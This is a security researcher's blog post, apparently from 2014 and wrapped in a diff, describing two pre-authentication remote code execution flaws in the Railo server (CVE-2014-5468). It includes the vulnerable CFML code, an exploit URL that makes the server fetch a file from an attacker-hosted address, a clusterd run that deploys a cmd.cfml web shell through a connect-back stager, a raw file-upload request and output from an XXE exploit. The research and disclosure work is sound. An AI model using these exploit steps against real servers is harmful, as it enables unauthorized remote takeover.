@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>railo security - part four - pre-auth remote code execution</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+
+	<div style="float: right;"></div><br>
+	<p>
+	<nav>
+			<a href="/"><b>post</b></a>.
+			
+			
+			<a href="/other/"><b>other</b></a>.
+			
+			<a href="/about/"><b>about</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>railo security - part four - pre-auth remote code execution</h1>
+			<b><time>2014-08-27</time></b>
+		       
+
+			<div>
+				<p><em><a href="http://hatriot.github.io/blog/2014/06/25/railo-security-part-one/">Part one - intro</a></em><br>
+<em><a href="http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/">Part two - post-auth rce</a></em><br>
+<em><a href="http://hatriot.github.io/blog/2014/08/23/railo-security-part-three">Part three - pre-auth password retrieval</a></em><br>
+<em>Part four - pre-auth remote code execution</em></p>
+<p>This post concludes our deep dive into the Railo application server by detailing not only one, but two pre-auth remote code execution vulnerabilities.  If you&rsquo;ve skipped the first three parts of this blog post to get to the juicy stuff, I don&rsquo;t blame you, but I do recommend going back and reading them; there&rsquo;s some important information and details back there.  In this post, we&rsquo;ll be documenting both vulnerabilities from start to finish, along with some demonstrations and notes on clusterd&rsquo;s implementation on one of these.</p>
+<p>The first RCE vulnerability affects versions 4.1 and 4.2.x of Railo, 4.2.1 being the latest release.  Our vulnerability begins with the file <code>thumbnail.cfm</code>, which Railo uses to store admin thumbnails as static content on the server.  As previously noted, Railo relies on authentication measures via the cfadmin tag, and thus none of the cfm files actually contain authentication routines themselves.</p>
+<p><code>thumbnail.cfm</code> first generates a hash of the image along with it&rsquo;s width and height:</p>
+<pre tabindex="0"><code>&lt;cfset url.img=trim(url.img)&gt;
+&lt;cfset id=hash(url.img&amp;&#34;-&#34;&amp;url.width&amp;&#34;-&#34;&amp;url.height)&gt;
+&lt;cfset mimetypes={png:&#39;png&#39;,gif:&#39;gif&#39;,jpg:&#39;jpeg&#39;}&gt;
+</code></pre><p>Once it&rsquo;s got a hash, it checks if the file exists, and if not, attempts to read and write it down:</p>
+<pre tabindex="0"><code>&lt;cffile action=&#34;readbinary&#34; file=&#34;#url.img#&#34; variable=&#34;data&#34;&gt;
+&lt;cfimage action=&#34;read&#34; source=&#34;#data#&#34; name=&#34;img&#34;&gt;
+
+&lt;!--- shrink images if needed ---&gt;
+&lt;cfif img.height GT url.height or img.width GT url.width&gt;
+    &lt;cfif img.height GT url.height &gt;
+        &lt;cfimage action=&#34;resize&#34; source=&#34;#img#&#34; height=&#34;#url.height#&#34; name=&#34;img&#34;&gt;
+    &lt;/cfif&gt;
+    &lt;cfif img.width GT url.width&gt;
+        &lt;cfimage action=&#34;resize&#34; source=&#34;#img#&#34; width=&#34;#url.width#&#34; name=&#34;img&#34;&gt;
+    &lt;/cfif&gt;
+    &lt;cfset data=toBinary(img)&gt;
+&lt;/cfif&gt;
+</code></pre><p>The <code>cffile</code> tag is used to read the raw image and then cast it via the <code>cfimage</code> tag.  The wonderful thing about <code>cffile</code> is that we can provide URLs that it will arbitrarily retrieve.  So, our URL can be this:</p>
+<pre tabindex="0"><code>192.168.1.219:8888/railo-context/admin/thumbnail.cfm?img=http://192.168.1.97:8000/my_image.png&amp;width=5000&amp;height=50000
+</code></pre><p>And Railo will go and fetch the image and cast it.  Note that if a height and width are not provided it will attempt to resize it; we don&rsquo;t want this, and thus we provide large width and height values.  This file is written out to <code>/railo/temp/admin-ext-thumbnails/[HASH].[EXTENSION]</code>.</p>
+<p>We&rsquo;ve now successfully written a file onto the remote system, and need a way to retrieve it.  The temp folder is not accessible from the web root, so we need some sort of LFI to fetch it.  Enter <code>jsloader.cfc</code>.</p>
+<p><code>jsloader.cfc</code> is a Railo component used to fetch and load Javascript files.  In this file is a CF tag called <code>get</code>, which accepts a single argument <code>lib</code>, which the tag will read and return.  We can use this to fetch arbitrary Javascript files on the system and load them onto the page.  Note that it MUST be a Javascript file, as the extension is hard-coded into the file and null bytes don&rsquo;t work here, like they would in PHP.  Here&rsquo;s the relevant code:</p>
+<pre tabindex="0"><code>&lt;cfset var filePath = expandPath(&#39;js/#arguments.lib#.js&#39;)/&gt;
+    &lt;cfset var local = {result=&#34;&#34;} /&gt;&lt;cfcontent type=&#34;text/javascript&#34;&gt;
+        &lt;cfsavecontent variable=&#34;local.result&#34;&gt;
+            &lt;cfif fileExists(filePath)&gt;
+                &lt;cfinclude template=&#34;js/#arguments.lib#.js&#34;/&gt;
+            &lt;/cfif&gt;
+        &lt;/cfsavecontent&gt;
+    &lt;cfreturn local.result /&gt;
+</code></pre><p>Let&rsquo;s tie all this together.  Using <code>thumbnail.cfm</code>, we can write well-formed images to the file system, and using the <code>jsloader.cfc</code> file, we can read arbitrary Javascript.  Recall how log injection works with PHP; we can inject PHP tags into arbitrary files so long as the file is loaded by PHP, and parsed accordingly.  We can fill a file full of junk, but if the parser has its way a single <code>&lt;?phpinfo();?&gt;</code> will be discovered and executed; the CFML engine works the same way.</p>
+<p>Our attack becomes much more clear: we generate a well-formed PNG file, embed CFML code into the image (metadata), set the extension to <code>.js</code>, and write it via <code>thumbnail.cfm</code>.  We then retrieve the file via <code>jsloader.cfc</code> and, because we&rsquo;re loading it with a CFM file, it will be parsed and executed.  Let&rsquo;s check this out:</p>
+<pre tabindex="0"><code>$ ./clusterd.py -i 192.168.1.219 -a railo -v4.1 --deploy ./src/lib/resources/cmd.cfml --deployer jsload
+
+        clusterd/0.3.1 - clustered attack toolkit
+            [Supporting 6 platforms]
+
+ [2014-06-15 03:39PM] Started at 2014-06-15 03:39PM
+ [2014-06-15 03:39PM] Servers&#39; OS hinted at windows
+ [2014-06-15 03:39PM] Fingerprinting host &#39;192.168.1.219&#39;
+ [2014-06-15 03:39PM] Server hinted at &#39;railo&#39;
+ [2014-06-15 03:39PM] Checking railo version 4.1 Railo Server...
+ [2014-06-15 03:39PM] Checking railo version 4.1 Railo Server Administrator...
+ [2014-06-15 03:39PM] Checking railo version 4.1 Railo Web Administrator...
+ [2014-06-15 03:39PM] Matched 2 fingerprints for service railo
+ [2014-06-15 03:39PM]   Railo Server Administrator (version 4.1)
+ [2014-06-15 03:39PM]   Railo Web Administrator (version 4.1)
+ [2014-06-15 03:39PM] Fingerprinting completed.
+ [2014-06-15 03:39PM] This deployer (jsload_lfi) requires an external listening port (8000).  Continue? [Y/n] &gt; 
+ [2014-06-15 03:39PM] Preparing to deploy cmd.cfml...
+ [2014-06-15 03:40PM] Waiting for remote server to download file [5s]]
+ [2014-06-15 03:40PM] Invoking stager and deploying payload...
+ [2014-06-15 03:40PM] Waiting for remote server to download file [7s]]
+ [2014-06-15 03:40PM] cmd.cfml deployed at /railo-context/cmd.cfml
+ [2014-06-15 03:40PM] Finished at 2014-06-15 03:40PM
+</code></pre><p>A couple things to note; as you may notice, the module currently requires the Railo server to connect back twice.  Once is for the image with embedded CFML, and the second for the payload.  We embed only a stager in the image that then connects back for the actual payload.</p>
+<p>Sadly, the LFI was unknowingly killed in 4.2.1 with the following fix to <code>jsloader.cfc</code>:</p>
+<pre tabindex="0"><code>&lt;cfif arguments.lib CT &#34;..&#34;&gt;
+    &lt;cfheader statuscode=&#34;400&#34;&gt;
+    &lt;cfreturn &#34;// 400 - Bad Request&#34;&gt;
+&lt;/cfif&gt;
+</code></pre><p>The <code>arguments.lib</code> variable contains our controllable path, but it kills our ability to traverse out.  Unfortunately, we can&rsquo;t substitute the .. with unicode or utf-16 due to the way Jetty and Java are configured, by default.  This file is pretty much useless to us now, unless we can write into the folder that <code>jsloader.cfc</code> reads from; then we don&rsquo;t need to traverse out at all.</p>
+<p>We can still pop this on Express installs, due to the Jetty LFI discussed in part 3.  By simply traversing into the extensions folder, we can load up the Javascript file and execute our shell.  Railo installs still prove elusive.</p>
+<p>buuuuuuuuuuuuuuuuuuuuuuuuut</p>
+<p>Recall the <code>img.cfm</code> LFI from part 3; by tip-toeing back into the admin-ext-thumbnails folder, we can summon our vulnerable image and execute whatever coldfusion we shove into it.  This proves to be an even better choice than <code>jsloader.cfc</code>, as we don&rsquo;t need to traverse as far.  This bug only affects versions 4.1 - 4.2.1, as <code>thumbnail.cfm</code> wasn&rsquo;t added until 4.1.  <code>CVE-2014-5468</code> has been assigned to this issue.</p>
+<p>The second RCE vulnerability is a bit easier and has a larger attack vector, spanning all versions of Railo.  As previously noted, Railo does not do per page/URL authentication, but rather enforces it when making changes via the <code>&lt;cfadmin&gt;</code> tag.  Due to this, any pages doing naughty things without checking with the tag may be exploitable, as previously seen.  Another such file is <code>overview.uploadNewLangFile.cfm</code>:</p>
+<pre tabindex="0"><code>&lt;cfif structKeyExists(form, &#34;newLangFile&#34;)&gt;
+    &lt;cftry&gt;
+        &lt;cffile action=&#34;UPLOAD&#34; filefield=&#34;form.newLangFile&#34; destination=&#34;#expandPath(&#39;resources/language/&#39;)#&#34; nameconflict=&#34;ERROR&#34;&gt;
+        &lt;cfcatch&gt;
+            &lt;cfthrow message=&#34;#stText.overview.langAlreadyExists#&#34;&gt;
+        &lt;/cfcatch&gt;
+    &lt;/cftry&gt;
+    &lt;cfset sFile = expandPath(&#34;resources/language/&#34; &amp; cffile.serverfile)&gt;
+    &lt;cffile action=&#34;READ&#34; file=&#34;#sFile#&#34; variable=&#34;sContent&#34;&gt;
+    &lt;cftry&gt;
+        &lt;cfset sXML     = XMLParse(sContent)&gt;
+        &lt;cfset sLang    = sXML.language.XMLAttributes.label&gt;
+        &lt;cfset stInLang = GetFromXMLNode(sXML.XMLRoot.XMLChildren)&gt;
+        &lt;cfcatch&gt;
+            &lt;cfthrow message=&#34;#stText.overview.ErrorWhileReadingLangFile#&#34;&gt;
+        &lt;/cfcatch&gt;
+    &lt;/cftry&gt;
+</code></pre><p>I mean, this might as well be an upload form to write arbitrary files.  It&rsquo;s stupid simple to get arbitrary data written to the system:</p>
+<pre tabindex="0"><code>POST /railo-context/admin/overview.uploadNewLangFile.cfm HTTP/1.1
+Host: localhost:8888
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0 Iceweasel/18.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost:8888/railo-context/admin/server.cfm
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=AaB03x
+Content-Length: 140
+
+--AaB03x
+Content-Disposition: form-data; name=&#34;newLangFile&#34;; filename=&#34;xxxxxxxxx.lang&#34;
+Content-Type: text/plain
+
+thisisatest
+--AaB03x--
+</code></pre><p>The tricky bit is where it&rsquo;s written to; Railo uses a compression system that dynamically generates compressed versions of the web server, contained within <code>railo-context.ra</code>.  A mirror of these can be found under the following:</p>
+<pre tabindex="0"><code>[ROOT]\webapps\ROOT\WEB-INF\railo\temp\compress
+</code></pre><p>The compressed data is then obfuscated behind two more folders, both MD5s.  In my example, it becomes:</p>
+<pre tabindex="0"><code>[ROOT]\webapps\ROOT\WEB-INF\railo\temp\compress\88d817d1b3c2c6d65e50308ef88e579c\0bdbf4d66d61a71378f032ce338258f2
+</code></pre><p>So we cannot simply traverse into this path, as the hashes change every single time a file is added, removed, or modified.  I&rsquo;ll walk the logic used to generate these, but as a precusor, we aren&rsquo;t going to figure these out without some other fashionable info disclosure bug.</p>
+<p>The hashes are calculated in <code>railo-java/railo-core/src/railo/commons/io/res/type/compress/Compress.java</code>:</p>
+<pre tabindex="0"><code>temp=temp.getRealResource(&#34;compress&#34;);                
+temp=temp.getRealResource(MD5.getDigestAsString(cid+&#34;-&#34;+ffile.getAbsolutePath()));
+if(!temp.exists())temp.createDirectory(true);
+}
+catch(Throwable t){}
+}
+
+    if(temp!=null) {
+        String name=Caster.toString(actLastMod)+&#34;:&#34;+Caster.toString(ffile.length());
+        name=MD5.getDigestAsString(name,name);
+        root=temp.getRealResource(name);
+        if(actLastMod&gt;0 &amp;&amp; root.exists()) return;
+</code></pre><p>The first hash is then <code>cid + &quot;-&quot; + ffile.getAbsolutePath()</code>, where <code>cid</code> is the randomly generated ID found in the <code>id</code> file (see part two) and <code>ffile.getAbsolutePath()</code> is the full path to the classes resource.  This is doable if we have the XXE, but 4.1+ is inaccessible.</p>
+<p>The second hash is <code>actLastMode + &quot;:&quot; + ffile.length()</code>, where <code>actLastMode</code> is the last modified time of the file and <code>ffile.length()</code> is the obvious file length.  Again, this is likely not brute forcable without a serious infoleak vulnerability.  Hosts &lt;= 4.0 are exploitable, as we can list files with the XXE via the following:</p>
+<pre tabindex="0"><code>bryan@debdev:~/tools/clusterd$ python http_test_xxe.py 
+88d817d1b3c2c6d65e50308ef88e579c
+
+[SNIP - in which we modify the path to include ^]
+
+bryan@debdev:~/tools/clusterd$ python http_test_xxe.py
+0bdbf4d66d61a71378f032ce338258f2
+
+[SNIP - in which we modify the path to include ^]
+
+bryan@debdev:~/tools/clusterd$ python http_test_xxe.py
+admin
+admin_cfc$cf.class
+admin_cfm$cf.class
+application_cfc$cf.class
+application_cfm$cf.class
+component_cfc$cf.class
+component_dump_cfm450$cf.class
+doc
+doc_cfm$cf.class
+form_cfm$cf.class
+gateway
+graph_cfm$cf.class
+jquery_blockui_js_cfm1012$cf.class
+jquery_js_cfm322$cf.class
+META-INF
+railo_applet_cfm270$cf.class
+res
+templates
+wddx_cfm$cf.class
+</code></pre><p><code>http_test_xxe.py</code> is just a small hack I wrote to exploit the XXE, in which we eventually obtain both valid hashes.  So we can exploit this in versions &lt;= 4.0 Express.  Later versions, as far as I can find, have no discernible way of obtaining full RCE without another infoleak or resorting to a slow, loud, painful death of brute forcing two MD5 hashes.</p>
+<p>The first RCE is currently available in clusterd dev, and a PR is being made to Metasploit thanks to @BrandonPrry.  Hopefully it can be merged shortly.</p>
+<p>As we conclude our Railo analysis, lets quickly recap the vulnerabilities discovered during this audit:</p>
+<pre tabindex="0"><code>Version 4.2:
+    - Pre-authentication LFI via `img.cfm` (Install/Express)
+    - Pre-authentication LFI via Jetty CVE (Express)
+    - Pre-authentication RCE via `img.cfm` and `thumbnail.cfm` (Install/Express)
+    - Pre-authentication RCE via `jsloader.cfc` and `thumbnail.cfm` (Install/Express) (Up to version 4.2.0)
+Version 4.1:
+    - Pre-authentication LFI via `img.cfm` (Install/Express)
+    - Pre-authentication LFI via Jetty CVE (Express)
+    - Pre-authentication RCE via `img.cfm` and `thumbnail.cfm` (Install/Express)
+    - Pre-authentication RCE via `jsloader.cfc` and `thumbnail.cfm` (Install/Express)
+Version 4.0:
+    - Pre-authentication LFI via XXE (Install/Express)
+    - Pre-authentication LFI via Jetty CVE (Express)
+    - Pre-authentication LFI via `img.cfm` (Install/Express)
+    - Pre-authentication RCE via XXE and `overview.uploadNewLangFile` (Install/Express)
+    - Pre-authentication RCE via `jsloader.cfc` and `thumbnail.cfm` (Install/Express)
+    - Pre-authentication RCE via `img.cfm` and `thumbnail.cfm` (Install/Express)
+Version 3.x:
+    - Pre-authentication LFI via `img.cfm` (Install/Express)
+    - Pre-authentication LFI via Jetty CVE (Express)
+    - Pre-authentication LFI via XXE (Install/Express)
+    - Pre-authentication RCE via XXE and `overview.uploadNewLangFile` (Express)
+</code></pre><p>This does not include the random XSS bugs or post-authentication issues.  At the end of it all, this appears to be a framework with great ideas, but <em>desperately</em> in need of code TLC.  Driving forward with a checklist of features may look nice on a README page, but the desolate wasteland of code left behind can be a scary thing.  Hopefully the Railo guys take note and spend some serious time evaluating and improving existing code.  The bugs found during this series have been disclosed to the developers; here&rsquo;s to hoping they follow through.</p>
+<figure><img src="/images/posts/2014/railo/railo-getrailo-error.jpg"/>
+</figure>
+
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/blog/the-fanciful-allure-and-utility-of-syscalls/">the fanciful allure and utility of syscalls</a></li>
+				
+				<li><a href="/blog/on-exploiting-cve-2021-1648-splwow64-lpe/">On Exploiting CVE-2021-1648 (splwow64 LPE)</a></li>
+				
+				<li><a href="/blog/digging-the-adobe-sandbox-ipc-internals/">Digging the Adobe Sandbox - IPC Internals</a></li>
+				
+				<li><a href="/blog/exploiting-leaked-process-and-thread-handles/">Exploiting Leaked Process and Thread Handles</a></li>
+				
+				<li><a href="/blog/code-execution-via-fiber-local-storage/">Code Execution via Fiber Local Storage</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2024 <a href="https://dronesec.pw/"><b>Bryan Alexander</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
